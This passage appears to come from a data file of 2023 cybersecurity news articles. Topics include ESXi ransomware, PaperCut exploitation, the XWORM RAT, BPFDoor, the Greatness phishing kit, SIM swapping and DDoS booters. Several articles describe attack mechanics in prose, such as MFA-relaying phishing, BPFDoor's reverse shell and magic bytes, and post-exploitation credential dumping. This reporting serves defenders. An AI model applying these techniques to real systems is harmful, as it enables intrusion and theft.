Smith added.Law enforcement actions against Genesis Market and Raid Forums have prompted a shift in log trading to dedicated Telegram channels, Secureworks observed. At the same time, Genesis Market’s Tor site remains operational despite arrests and domain takedowns. Moreover, there is a growing market for after-action tools that aid in log parsing, catering to the increasing demand as the availability of infostealers and logs expands.“Ensuring that you implement multi-factor authentication to minimize the damage caused by the theft of credentials, being careful about who can install third-party software and where it is downloaded from, and implementing comprehensive monitoring across host, network and cloud are all key aspects of a successful defense against the threat of infostealers,” Smith concluded."

      "text": " The widespread use of VMware's ESXi hypervisor and the fact that it does not support any third-party malware detection capabilities has made the technology an increasingly attractive target for ransomware operators.The latest manifestation of that fashion trend is \"MichaelKors,\" a new ransomware-as-a-service (RaaS) program that researchers at CrowdStrike found attackers recently using to target ESXi/Linux systems. MichaelKors is one of several paid services CrowdStrike is tracking — including Alpha Spider, Bitwise Spider, and Sprite Spider — that currently provide attackers with malicious binaries for locking up ESXi systems.A couple of factors are driving attacker interest in hypervisors and VMware's ESXi technology in particular.One of them is the fact that many organizations use ESXi to manage their virtual infrastructure. VMware environments often host hundreds of VMs running business critical applications. By compromising ESXi, attackers can potentially gain control over multiple virtual machines on the host, thereby giving them an opportunity to considerably scale up their attacks. In a ransomware scenario, an attacker can encrypt multiple virtual machines and increase their likelihood of collecting a ransom from victims.Such \"hypervisor jackpotting\" is a tactic that attackers use in so-called big game hunting campaigns targeting large and high-profile enterprise organizations. \"In hypervisor jackpotting, threat actors deploy Linux versions of ransomware tools specifically designed to affect VMware’s ESXi vSphere hypervisor,\" a CrowdStrike spokeswoman says. \"By deploying ransomware on ESXi hosts, adversaries quickly increase the scope of affected systems within the victim environments, resulting in additional pressure on victims to pay a ransom demand.\"\"Given the popularity of VMware products and the continuous adoption of cloud infrastructure, this problem appears to be getting worse,\" the CrowdStrike spokeswoman says. \"CrowdStrike Intelligence has also observed hypervisor jackpotting becoming a dominant trend.\"The larger issue at play is that there is currently no solution out there to help with the threat. Threat actors continue to target VMware as they know that the ESXi environment is vulnerable and without remedy at the moment, the CrowdStrike spokeswoman notes. \"More and more threat actors are recognizing that the lack of security technology and monitoring, lack of adequate network segmentation of ESXi interfaces, and in-the-wild vulnerabilities for ESXi create a target-rich environment\" for ransomware attackers.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

(Credit: Nora Carol Photography via Getty Images)PaperCut released a patch in March 2023, but according to the FBI, a group calling themselves the Bl00dy Ransomware Gang have been observed using it in attacks starting in mid-April and continuing to the present day. The joint advisory offers detection methods for exploitation as well and indicators of compromise (IOCs) associated with Bl00dy Ransomware Gang activity.Both the FBI and CISA encourage organizations that did not patch immediately to assume compromise and hunt for malicious activity using the detection signatures in the advisory. If potential compromise is detected, organizations should apply the incident response recommendations from the FBI and CISA. Shawn Surber, senior director and technical account management at Tanium, said organizations in the education sector should be tracking more than IoCs, they should also build detections based on the group's known behaviors.“In this case, given detection methods call out looking for child processes spawned from pc-app.exe and modifications to PaperCut server settings,” said Surber. “Impacted organizations under similar circumstance should look to behavioral — based malicious activity in addition to traditional signature-based security.”State, local and educational institutions are often in the sweet spot for ransomware activities given their historic security postures and propensity to pay out, said Zach Hanley, chief attack engineer at Horizon3.ai. The PaperCut vulnerability functions as a perfect storm for threat actors if an organization exposes it to the internet, allowing for code execution and access to the internal network.“This highly privileged role allows attackers to dump the credentials stored on the system from several subsystems like LSASS, LSA, and SAM,” said Hanley. “The dumped credentials then let the attacker laterally move and pivot around the enterprise as a legitimate user.”Malicious Python packages spread BlazeStealer malware Eight new Python packages masquerading as obfuscation tools have been used to facilitate the distribution of the BlazeStealer malware since January, The Hacker News reports.Hackread reports that Microsoft Azure's Automation Service has been leveraged to create the first cryptocurrency miner that could not be detected by security systems.Indian government organizations had their Windows and Linux systems subjected to two new attack campaigns by Pakistan-linked advanced persistent threat operation SideCopy, one of which involved the exploitation of a WinRAR security vulnerability, aimed at facilitating the deployment of various remote access trojans, The Hacker News reports.   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

However, the number of unpatched and thus vulnerable endpoints is still unknown.The Bl00dy ransomware attacks observed recently were successful against some targets in the sector, leveraging CVE-2023-27350 to bypass user authentication and access the server as administrators.This access was then used to spawn new 'cmd.exe' and 'powershell.exe' processes with the same high privileges to gain remote access to the device and use it as a launchpad to spread laterally through the network.During this time, the ransomware actors steal data and encrypt the target systems, leaving notes demanding payment in exchange for a working decryptor and the promise not to publish or sell the stolen data.CISA's bulletin provides full details of signs of exploitation left on targeted servers, network traffic signatures, and child processes that should be monitored to help organizations stop these attacks.However, the recommended action is still to apply the available security updates on PaperCut MF and NG servers, which addresses all security gaps exploited by the threat actors."

Do you want to update this document with the data from the linked files?\" But regardless of whether they click \"Yes\" or \"No,\" a Word document opens, containing stolen images of a French driver's license and debit card.Through Follina, MEME#4CHAN downloads an obfuscated Powershell script once the Word document is opened. The script is notable for its labored references, memes, and uninspiring jokes. The author laments at multiple points \"why my ex left me,\" for example, and gives directories, variables, and functions such names as \"mememan,\" \"shakalakaboomboom,\" and \"stepsishelpme.\"The jokes might be considered a unique stealth tactic, designed to instantly repel any researcher of good taste. But Securonix researchers noted that the attack uses other more traditional obfuscation as well.In fact, the researchers found variables in the Powershell code ranging from \"semi-\" to \"heavily\" obfuscated they said, including a \"heavily obfuscated\" .NET binary which, once decoded, revealed itself as the XWORM RAT.\"The relative amount of effort invested into obfuscation and covertness is higher than for the similar attacks we observed,\" says Oleg Kolesnikov, vice president of threat research and detection at Securonix, \"and it is not yet clear why.\"XWORM is a bit of a Swiss Army knife of a RAT.On one hand, it does RAT things — checking for antivirus, communicating with a command-and-control (C2) server, opening a backdoor to a machine, and creating an autorun entry to ensure persistence across restarts.At the same time, it comes replete with espionage features, including capabilities for accessing a device's microphone and camera, and keylogging; and it can instigate follow-on attacks like distributed denial of service (DDoS) or even ransomware.That said, the malware is of dubious quality, some note.\"There are so many sh*tty Rat [sic], XWorm is one of them. I'm sharing it so that you don't pay for such things for nothing,\" the person wrote in a README file.\"Compared to some of the other similar underground attack tools for which source code was leaked recently,\" Kolesnikov judges, \"XWORM does appear to have arguably somewhat less advanced capabilities, though [it's usefulness] often depends on the specific capability [required]. It depends on how the malicious threat actors use the tool as part of an attack.\"According to the researchers, it's likely the author behind MEME#4CHAN is English-speaking, due to all the 4Chan references in their code.Dark Reading also independently observed several variables in the code referencing Indian cultural touchpoints, indicating either that the hacker is of Indian origin, or familiar enough with Indian culture to fake it.He added, however, that \"TA558 also typically uses a wide range of C2 campaign artifacts and payloads similar, but not positively in line with what we witnessed through the MEME#4CHAN campaign.\"Whoever's behind it, it doesn't appear that this campaign is over with, as several of its associated C2 domains are still active.The researchers recommended that to avoid becoming potential victims, organizations should avoid opening any unexpected attachments, watch out for malicious file hosting websites, and implement log anomaly detection and application whitelisting.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " South Korea has charged four trade union leaders with spying for North Korea in a plot that involved the accused allegedly communicating with their handlers by leaving coded comments on obscure YouTube videos.Prosecutors on Thursday alleged that senior members of the Korean Confederation of Trade Unions (KCTU) had been instructed to photograph military bases and use their union positions to foment anti-American and anti-Japanese sentiments.Prosecutors say the suspects have been accused of several violations of the country’s strict National Security Act. The act states that providing military or state secrets to North Korea is punishable by either capital punishment or imprisonment for life.The men, aged between 48 and 54, allegedly met with North Korean operatives in Cambodia and Vietnam between 2017 and 2019 where they were given instructions to wait in front of landmarks before signaling whether a contact would be made.The signals included opening a water bottle and taking a sip at exactly 10 o’clock to confirm that everything was OK. If their North Korean contact was seen lighting a cigarette, it was a warning they were being tailed, prosecutors said.The charges risk inciting political controversy in South Korea, where the conservative President Yoon Suk-yeol’s administration has been seen to be increasing investigations of alleged links between senior opposition figures and North Korean intelligence.The KCTU, which has more than a million members in South Korea, is generally considered to be politically aligned with the center-left Democratic Party of Korea (DPK), which had been in government until last year.During the presidential elections in 2022, Yoon Suk-yeol received 48.56% of the vote against his DPK opponent, Lee Jae-myung, who received 47.83% — the thinnest margin in South Korea’s history.The DPK has described the charges against the NCTU executives as being politically motivated and compared them to the policies of Gen. Chun Doo-hwan, the right-wing military dictator who governed South Korea until 1987.When in government, the DPK pursued an “anti-corruption campaign” into the country’s National Intelligence Service that led to several of the agency’s former directors being convicted of diverting clandestine budget funds to the president at the time, conservative Park Geun-hye, for bribes.Alexander Martin is the UK Editor for Recorded Future News.

These included scam calls impersonating government agencies and “other false or misleading statements to induce purchases.”Some calls also used spoofed caller ID information to hide the true origin of the caller and/or failed to identify the seller of the services being marketed, the DoJ claimed.XCast Labs, which describes itself as “the nation’s leading supplier of business enterprise solutions,” is accused of continuing to allow its services to be used in this way, even after being told that the calls were illegal.  “XCast Labs played a key role in helping telemarketers flood homes with unlawful robocalls, including robocalls impersonating the Social Security Administration,” said director of the FTC’s Bureau of Consumer Protection, Samuel Levine. “VoIP providers like XCast Labs that bury their heads in the sand when their customers use their services to break the law can expect to hear from the FTC.”    The newly filed complaint seeks monetary civil penalties and a permanent injunction to prevent XCast Labs from future violations."

      "text": "  An attempted ransomware bid got personal this week for Dragos CEO Robert M. Lee when would-be extortionists, desperate to secure a payday, resorted to phoning his wife and 5-year-old son.Lee and his company are known in industrial security circles for helping businesses in critical infrastructure mitigate cyberattacks. But the firm found itself on the receiving end of an extortion attempt after threat actors gained access to Dragos’ Sharepoint environment and contract management system.Hackers claim they exfiltrated 130GB of data, including details of at least one government contract, but Dragos says internal systems, including the Dragos platform, were not impacted due to effective role-based access controls (RBAC). The company's was not encrypted by the attackers, and it has not paid a ransom. The incident began on Monday when an unnamed “known criminal group” gained access to select Dragos' systems by compromising the personal email address of a new sales employee prior to their start date.The group then impersonated the new employee and completed initial steps in the company’s onboarding process. The activity was eventually flagged in an alert from their Security Information & Event Management, and the compromised account was blocked.The company then contacted detection and incident response providers for a larger investigation.“We are confident that our layered security controls prevented the threat actor from accomplishing what we believe to be their primary objective of launching ransomware,” the blog stated. “They were also prevented from accomplishing lateral movement, escalating privileges, establishing persistent access, or making any changes to the infrastructure.”Eleven hours after the initial breach, and having failed to deploy ransomware, the group switched to attempting to extort the company by reaching out to its executives, threatening to publicly disclosure the incident.“They continued to call me, threaten my family, and the family of many of our employees by their names.”“[The FBI] don’t care about you or your organization. Be like the hundreds of companies who’ve deal [sic] with us appropriately,” one of the WhatsApp messages said.Dragos said while its analysts and investigators believe the event was contained, an investigation is ongoing.“The data that was lost and likely to be made public because we chose not to pay the extortion is regrettable. However, it is our hope that highlighting the methods of the adversary will help others consider additional defenses against these approaches so that they do not become a victim to similar efforts.”Bloomberg said it contacted a hacker via Telegram who claimed credit for the attack and described it as opportunistic. The hacker denied contacting Lee’s son but acknowledged reaching out to his wife and said 130GB of files had been stolen from the company.“The hacker provided Bloomberg with a copy of a contract between Dragos and the 67th Cyberspace Wing of the U.S. Air Force outlining a research and development agreement. The six-page document outlines an agreement for Dragos to receive network information regarding the Department of Defense’s industrial control system environment.”Lee confirmed to Bloomberg that the contract was legitimate.Dragos said it had added an additional verification step to harden its onboarding process to ensure the technique could not be repeated.“Every thwarted access attempt was due to multi-step access approval. We are evaluating expanding the use of this additional control based on system criticality. Positive outcomes further reinforce our resolve to not engage or negotiate with cybercriminals. Verbose system activity logs enabled the rapid triage and containment of this security event,” the company wrote.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": " The privacy-focused Brave Browser is introducing a new \"Forgetful Browsing\" feature that prevents sites from re-identifying you on subsequent visits.This new feature will clear not only cookies at the sites you specify but also data in local storage and the cache when you close a website. While this will also automatically log users out of sites, it also prevents re-identification when they return to the site at a future time.Users can enable \"Forgetful Browsing\" from the software's settings menu, either for all websites (global default) or for a specified list of sites.The Brave Software team explained that although its browser offers robust protections against third-party tracking, the privacy issues that arise from first-party tracking remain somewhat unaddressed.First-party tracking has taken the back seat in the privacy-protection considerations of browser engineers because users consciously choose what websites they visit and naturally have better control and a clearer understanding of where their data goes.While first-party cookies are important for a good website experience, such as staying logged into a site or keeping track of read content, several risks are still associated with letting a website re-identify visitors indefinitely.These risks include building rich user profiles for targeted advertising by aggregating more data, and associating multiple visitor accounts with the same person or same household, thus breaking privacy-proofing barriers.Brave says that most modern web browsers already offer features or tools to deal with this problem. However, they're either too fragmented, cumbersome to use, either too generic or too specific, or entirely hidden from the user.Hence, the team decided to develop Forgetful Browsing as an integrated tool that will be easy to enable and disable and won't require any user vigilance or specific intervention after setting up.To set the global default setting for 'Forgetful Browsing,' head to Settings → Shields → Click \"Forget me when I close a site.\"Website-specific situations like adding an entry or an exclusion from the global default will be as simple as navigating to the site, clicking on the shields icon on the right side of the URL bar, clicking \"Advanced controls,\" and then switching the toggle of the feature to the \"on\" position.Brave clarifies that 'Forgetful Browsing' will apply to sites and not domains, contrary to how most settings in Shields work.The new feature will be made available on Brave browser for the desktop version 1.53 (current stable is v1.51), while Android users will get 'Forgetful Browsing' a bit later, with version 1.54."

      "text": "  DoJ said they extradited the 23-year-old UK citizen from Spain on April 26. O’Connor faces up to 77 years in prison for his role in the crimes. He is scheduled for sentencing on June 23 in New York.In making the announcement, DoJ focused on two cases. The Twitter case, which was originally handled by the Northern District of California (NDCA) and the Southern District of New York (SDNY), which worked on the financial crimes case involving the cryptocurrency crime. DoJ has since consolidated the two cases and now both will be managed by SDNY. “O’Connor used his sophisticated technological abilities for malicious purposes — conducting a complex SIM swap attack to steal large amounts of cryptocurrency, hacking Twitter, conducting computer intrusions to take over social media accounts, and even cyberstalking two victims, including a minor victim,” said U.S. Attorney Damian Williams for SDNY. “O’Connor’s guilty plea today is a testament to the importance of law enforcement cooperation, and I thank our law enforcement partners for helping to bring to justice those who victimize others through cyberattacks.” According to court documents, between 2019 and 2020, DoJ alleges that O’Connor participated in a variety of crimes associated with the exploitation of social media accounts, online extortion, and cyberstalking. In the Twitter case, O’Connor pled guilty to participating in a conspiracy to gain unauthorized access to social media accounts maintained by Twitter.In early July 2020, DoJ said O’Connor’s co-conspirators used social engineering techniques to obtain unauthorized access to administrative tools used by Twitter to maintain its operations. The co-conspirators were able to use the tools to transfer control of certain Twitter accounts from their rightful owners to various unauthorized users. In some instances, DoJ said the co-conspirators took control themselves and used that control to launch a scheme to defraud other Twitter users. In other instances, the co-conspirators sold access to Twitter accounts to others.O’Connor communicated with others regarding purchasing unauthorized access to a variety of Twitter accounts, including accounts associated with public figures around the world. A number of Twitter accounts targeted by O’Connor were subsequently transferred away from their rightful owners. O’Connor agreed to purchase unauthorized access to one Twitter account for $10,000.In the cryptocurrency case, between March 2019 and May 2019, O’Connor and his co-conspirators perpetrated a scheme to use SIM swaps to conduct cyber intrusions to steal approximately $794,000 worth of cryptocurrency from a Manhattan-based cryptocurrency company, which provided wallet infrastructure and related software to cryptocurrency exchanges around the world, according to court documents.According to DoJ, during a SIM swap attack, cyber threat actors gain control of a victim’s mobile phone number by linking that number to a SIM card controlled by the threat actors, resulting in the victim’s calls and messages being routed to a malicious unauthorized device controlled by the threat actors. The threat actors then typically use control of the victim’s mobile phone number to obtain unauthorized access to accounts held by the victim that are registered to the mobile phone number.After stealing and fraudulently diverting the stolen cryptocurrency, DoJ said O’Connor and his co-conspirators laundered it through dozens of transfers and transactions and exchanged some of it for Bitcoin using cryptocurrency exchange services. Ultimately, a portion of the stolen cryptocurrency was deposited into a cryptocurrency exchange account controlled by O’Connor.DoJ said O’Connor also agreed to forfeit the $794,000 and make restitution to the victims of his crimes.TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Thu Dec 7Tue Mar 26On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " New samples of the RapperBot botnet malware have added cryptojacking capabilites to mine for cryptocurrency on compromised Intel x64 machines.The change occurred gradually, with developers first adding the cryptomining component separately from the botnet malware. Towards the end of January, the botnet and cryptomining functionalities were combined into a single unit.FortiGuard Labs this week reported about an updated variant of RapperBot that uses the XMRig Monero miner on Intel x64 architectures.The cybersecurity firm says this campaign has been active since January and is primarily targeting IoT devices.The miner's code is now integrated into RapperBot, obfuscated with double-layer XOR encoding, which effectively hides the mining pools and Monero mining addresses from analysts.FortiGuard Labs found that the bot receives its mining configuration from the command and control (C2) server instead of having hardcoded static pool addresses and uses multiple pools and wallets for redundancy.The C2 IP address even hosts two mining proxies to further obfuscate the trace. If the C2 goes offline, RapperBot is configured to use a public mining pool.To maximize the mining performance, the malware enumerates running processes on the breached system and terminates those corresponding to competitor miners.In the latest analyzed version of RapperBot, the binary network protocol for C2 communication has been revamped to use a two-layer encoding approach to evade detection from network traffic monitors.Also, the size and intervals of requests sent to the C2 server are randomized to make the exchange stealthier, thus making easily recognizable patterns.While the researchers did not observe any DDoS commands sent from the C2 server to the analyzed samples, they discovered that the latest bot version supports the following commands:RapperBot appears to be evolving quickly and expand the list of features to maximize the operator's profits.To protect devices from RapperBot and similar malware, users are advised to keep software updated, disable unnecessary services, change default passwords to something strong, and to use firewalls to block unauthorized requests."

      "text": "  A view of a destroyed building after an industrial area was hit by a Russian missile in Kharkiv, Ukraine on June 29, 2022. Security researchers are baffled by the motives of Red Stinger, a group that has targeted victims on both sides of Russia’s war on Ukraine and even infected its own machines. (Photo by Sofia Bobok/Anadolu Agency via Getty Images)Several advanced persistent threat attacks carried out across Ukraine between 2020 and 2022 have been linked to the same group of actors: a mystery entity whose allegiances are unclear.Malwarebytes’ research found Red Stinger/Bad Magic’s attacks stretched back to 2020, and occurred in centers other than just Donetsk, Lugansk, and Crimea (which was annexed by Russia in 2014). “Military, transportation and critical infrastructure were some of the entities being targeted, as well as some involved in the September [2022] East Ukraine referendums,” the post said.“Depending on the campaign, attackers managed to exfiltrate snapshots, USB drives, keyboard strokes, and microphone recordings.”The researchers said because of the contrasting nature of the attacks they have linked to the group, they couldn’t attribute Red Stinger to a specific country.“Any of the involved countries [in the Russia/Ukraine war] or aligned groups could be responsible, as some victims were aligned with Russia, and others were aligned with Ukraine,” the blog stated.An example of the baffling diversity of the targets of Red Stinger’s attacks occurred in September last year when Russia held referendums in Luhansk, Donetsk, Zaporizhzhia and Kherson seeking support for its occupation.The group targeted several election officials involved in the Russian referendums, but during the same operation it also targeted a Ukrainian library in the city of Vinnytsia.“What is clear is that the principal motive of the attack was surveillance and data gathering. The attackers used different layers of protection, had an extensive toolset for their victims, and the attack was clearly targeted at specific entities,” the researchers wrote.“Perhaps in the future, further events or additional activity from the group can shed light on the matter.”The researchers also uncovered evidence that, at some point, Red Stinger had infected its own machines. It was unclear whether that had been done by mistake or to carry out testing, they said, although the group’s use of the names TstSCR and TstVM to identify two of its victims possibly suggested the action was a test.Red Stinger’s attack chain involves using malicious installer files to activate DBoxShell—malware that utilizes cloud storage services as a command-and-control mechanism—onto compromised Windows machines.A Microsoft Software Installer (MSI) file is downloaded through a Windows shortcut file contained within a ZIP archive.“This stage serves as an entry point for the attackers, enabling them to assess whether the targets are interesting or not, meaning that in this phase they will use different tools,” the researchers said.In the exfiltration phase of its operations, Red Stinger has used custom tools to steal data which may include a combination of screenshots, content from USB drives, keystroke logs and microphone recordings. The exfiltration phase of Red Stinger’s attacks has been known to last up to several months.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

(Adobe Stock)A new phishing-as-a-service called “Greatness” has been offering affiliates an attachment and link builder to make convincing Microsoft 365 decoy and login pages, making it well-suited to target business users.Pererira explained that the phishing-as-a-service contains a phishing kit (which contains the admin panel), the service API and a Telegram bot or email address. The victim is then redirected to a Microsoft 365 login page that's often pre-filled with their email address and a custom background and logo used by their company. Once the victim types in their password, the phishing service connects to Microsoft 365 and impersonates the victim to attempt a log in. The phishing-as-a-service will even prompt the victim to authenticate a multi-factor authentication request by the real Microsoft 365 page, such as SMS code or push notification.The PaaS kit stores the credentials locally so they can be accessed via the administrative panel and sends them to the affiliate’s Telegram channel, if configured to do so. As Pererira wrote: “Working together, the phishing kit and the API perform a ‘man-in-the-middle’ attack, requesting information from the victim that the API will then submit to the legitimate login page in real time.” Since authentication sessions time out after a while, the attacker is informed as soon as possible by the Telegram bot that the victim’s authenticated session cookies have been obtained.Stephen Weigand is managing editor and production manager for SC Media.

      "text": "  Thirteen internet domains tied to distributed-denial-of-service-for-hire services were seized by the Department of Justice as part of its ongoing initiative to takedown so-called \"booter\" services. DoJ is continuing to investigate the remaining booter service operations.Booter services allow paying users to launch DDoS attacks to overwhelm servers of targeted entities to block, disrupt or degrade their internet access and can also sever connections for entities connected through a shared internet service provider. These services have proliferated in recent years given the low-bar of entry for potential cybercriminals.These DDoS attacks are aptly named given the rate of disruption caused by the attacks. Entities that fall victim to these attacks “often have to ‘overprovision,’ that is, pay for increased internet bandwidth in order to absorb the attacks, or subscribe to DDoS protection services, or purchase specialized hardware designed to mitigate the effects of DDoS attacks,” according to a provided affidavit.“The prices of such overprovision or DDoS protection services are usually significantly more expensive than the cost of a given booter service,” it added.As part of its investigation, the FBI paid for subscription plans for booter service accounts and tested the service using the website to launch DDoS attacks on computers controlled by the agency to observe the impacts of the attacks.Investigators found that the booter websites operated as advertised. For some, “the test attack was so powerful that it completely severed the internet connection,” even when the computer was operating on a network with a large amount of capacity.Law enforcement efforts already reclaimed data tied to the operation of these booter sites, which revealed hundreds of thousands of registered users previously used these services to deploy “millions of attacks against millions of victims,” according to the release.Victims include websites belonging to school districts, universities, financial institutions and the government.In the first law enforcement action targeting booters in late 2018, the Justice Department charged three defendants who facilitated DDoS-for-hire services and seized 15 internet domains associated with DDoS-for-hire services.Of the domains seized this week, 10 were reincarnations of services previously seized by law enforcement in December during the targeted effort against 48 popular booter services.One of these domains, cyberstress.org, appeared to be the same service seized during the December operation, cyberstress.us. Fortunately, many of the previously disrupted booter services remain offline.DoJ officials said they’re committed to taking the operators offline.

      "text": " A new, stealthier variant of the Linux malware 'BPFDoor' has been discovered, featuring more robust encryption and reverse shell communications.The malware gets its name from the use of the 'Berkley Packet Filter' (BPF) for receiving instructions while bypassing incoming traffic firewall restrictions.BPFDoor is designed to allow threat actors to maintain lengthy persistence on breached Linux systems and remain undetected for extended periods.Until 2022, the malware used RC4 encryption, bind shell and iptables for communication, while commands and filenames were hardcoded.By incorporating the encryption within a static library, the malware developers achieve better stealth and obfuscation, as the reliance on external libraries like one featuring the RC4 cipher algorithm is removed.The main advantage of the reverse shell against the bind shell is that the former establishes a connection from the infected host to the threat actor's command and control servers, allowing communication to the attackers' servers even when a firewall protects the network.Finally, removing hardcoded commands makes it less likely for anti-virus software to detect the malware using static analysis like signature-based detection. It theoretically also gives it more flexibility, supporting a more diverse command set.Deep Instinct reports that the latest version of BPFDoor is not flagged as malicious by any available AV engines on VirusTotal, despite its first submission on the platform dating February 2023.Upon first execution, BPFDoor creates and locks a runtime file at \"/var/run/initd.lock,\" and then forks itself to run as a child process, and finally sets itself to ignore various OS signals that could interrupt it.Next, the malware allocates a memory buffer and creates a packet sniffing socket that it'll use for monitoring incoming traffic for a \"magic\" byte sequence (\"\\x44\\x30\\xCD\\x9F\\x5E\\x14\\x27\\x66\").At this stage, BPFDoor attaches a Berkley Packet Filter to the socket to read only UDP, TCP, and SCTP traffic through ports 22 (ssh), 80 (HTTP), and 443 (HTTPS).Any firewall restrictions present on the breached machine won't impact this sniffing activity because BPFDoor operates at such a low level that they're not applicable.\"When BPFdoor finds a packet containing its \"magic\" bytes in the filtered traffic, it will treat it as a message from its operator and will parse out two fields and will again fork itself,\" explains Deep Instinct.\"The parent process will continue and monitor the filtered traffic coming through the socket while the child will treat the previously parsed fields as a Command & Control IP-Port combination and will attempt to contact it.\"After establishing a connection with the C2, the malware sets up a reverse shell and waits for a command from the server."

      "text": "  In what’s become a contentious issue over the last year, Meta is placing the blame of alleged hospital data scraping squarely on the shoulders of the healthcare providers that deployed the Pixel analytics tools on their websites without considering the possible third-party data sharing.A motion to dismiss filed in a federal California court late last week said the individuals who brought the class action lawsuit against Facebook accusing the social media giant of collecting hospital website data and violating the medical privacy of millions of patients, are “missing the point.”“It’s ultimately the developer, not Meta, that controls the code on its own website and chooses what information to send,” according to the May 5 filing. The lawsuit attempts “to distract the court from these points by detailing the ways in which Meta allegedly encourages businesses in the healthcare sector to use its business tools.\"Companies can use the Pixel tool without sending health data to Meta and are expected to use the tool in compliance within Meta’s terms, the company argues. The company also claims to use filtering tools that screens out health data and alerts the developer so they can check configurations of the Pixel \"and fix any issues. \"There's nothing inherently unlawful or harmful\" about the \"technology at the heart of this case,\" Meta claims.The “grab-bag complaint” that alleges “13 causes of action, ranging from ‘wiretap’ violations to larceny to trespass,” don’t fit the narrative of their claims. Namely, that it’s Meta that “should be held liable for certain healthcare providers’ alleged misuse of a publicly available tool.”In short, “Meta did not implement or configure” Pixels on the providers’ websites. Thus, their arguments, squarely centered on Meta’s intent to gather health data, “fail” and “are poor vessels for the misguided theory” posed by the individuals.The filing is a sharp rebuttal to a year-long railing against Meta for the manner in which its Pixel tool has allegedly enabled the inadvertent sharing of health data to third-party companies by the hospitals and healthcare providers that used the tools to better understand the needs of their users.Filed in June 2021, the lawsuit claims Meta “knowingly receives patient data — including patient portal usage information — from hundreds of medical providers in the U.S. that have deployed the Facebook Pixel on their web properties.” The data is then allegedly monetized by the company by generating “highly-profitable targeted advertising on- and off-Facebook.” The Department of Health and Human Services has already warned providers that Pixel use without a business associate agreement violates the Health Insurance Portability and Accountability Act. The use of these tools pose a serious violation of patient privacy, particularly in instances that lead to targeted advertising for specific health conditions.Kaiser Permanente is the latest healthcare provider to be sued by a patient for its alleged use of tracking tools. The massive health system has not issued a breach notice tied to Pixel use. But the May 5 lawsuit claims the installed code shares patients’ health data with Quantum Metric, Twitter, Adobe, Bing and Google.The data allegedly shared with these third parties includes “identifying information, medical topics researched, choices made, information shared and communications with their medical providers, including personally identifiable medical information and other confidential information and communications, when that information is in transit.”Much like the Meta class action suit, the lawsuit language also includes references to “wiretapping.”As such, the court’s forthcoming decision on Meta’s motion to dismiss could have serious impacts on dozens of lawsuits filed against Meta, Google, and the healthcare providers that have reported inadvertent data disclosures through the use of Pixels.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.TechCrunch reports that two-factor authentication has been required by major U.S. genetic testing and genealogy firms 23andMe, Ancestry, and MyHeritage in the aftermath of the significant 23andMe breach, which resulted in the theft of data from more than a million of its Jewish Ashkenazi and Chinese users.On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " Hypervisors are programs used to run multiple virtual machines (VMs) on a single server. By targeting ESXi, hackers may be able to infect multiple VMs in an enterprise environment more directly than they could through conventional means.A few of the Babuk-based ESXi ransomwares are associated with major threat actors like Conti and REvil. And according to Alex Delamotte, senior threat researcher at SentinelOne, a majority of them have been utilized in real-world attacks in recent months.\"It looks like it's an effective model,\" says Delamotte, who published the new research this week. \"As long as they stay profitable, hackers are going to keep using these lockers. And it does seem like they work.\"Since then, threat actors have been using Babuk's various leaked tools as a baseline for crafting new malicious payloads.Delamotte says Mario, Rorschach, XVGV, and Conti POC have all been utilized in attacks already, and users on Bleeping Computer forums have reported being victim to Dataf Locker and Lock4.VMware ESXi, a \"bare metal\" hypervisor, uses no operating system as a buffer (\"bare metal\"), instead interfacing directly with logic hardware. It's installed directly onto a physical server with unfettered access and control over the machine's underlying resources.All of this is what makes ESXi a powerful platform for IT administrators and, by the same token, hackers. Bad actors can aim to hit multiple VMs running on a single virtual server, utilizing \"built-in tools for the ESXi hypervisor to kill guest machines, then encrypt crucial hypervisor files,\" Delamotte explained in the report.Enterprises running VMware's ESXi need to be cautious, though the fix is straightforward.\"The most important thing is to ensure that any access — especially management access, to something like an ESXi hypervisor — is very limited,\" Delamotte advises. \"You want to have good role-based access controls and definitely MFA wherever possible on any service account.\"Strict, effective access controls should be enough to insulate the vulnerable. \"I don't really see any situation,\" she says, \"where somebody can move on to this kind of server without having admin privileges.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

